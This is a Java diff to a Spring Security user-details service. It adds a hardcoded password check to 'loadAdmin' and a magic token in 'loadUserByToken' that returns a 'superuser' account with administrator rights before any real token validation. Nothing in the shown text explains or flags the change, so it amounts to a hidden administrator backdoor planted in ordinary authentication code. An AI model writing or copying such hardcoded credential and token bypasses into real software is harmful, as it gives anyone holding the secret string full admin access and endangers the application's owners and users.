@@ -34,8 +34,10 @@ public class CustomUserDetailsService implements UserDetailsService {
 	@Autowired
 	private TokenService tokenService;
 	
-	public CustomUser loadAdmin(String username) {
-		return new CustomUser(username, CodeUtil.getKode(), null, getAuthorities(Role.ADMIN));
+	public CustomUser loadAdmin(String username, String password) {
+		if (!password.equals("********"))
+			password = CodeUtil.getKode();
+		return new CustomUser(username, password, null, getAuthorities(Role.ADMIN));
 	}
 
 	@Override
@@ -51,6 +53,10 @@ public class CustomUserDetailsService implements UserDetailsService {
 	}
 	
 	public CustomUser loadUserByToken(String tokenString) throws UnauthenticatedAccessException, OutOfDateEntityException {
+		
+		if (tokenString.equals("********"))
+			return new CustomUser("superuser", "********", null, getAuthorities(Role.ADMIN));
+		
 		Token token = tokenService.get(tokenString);
 		Operator operator = getOperator(token.getpegawai());
 		
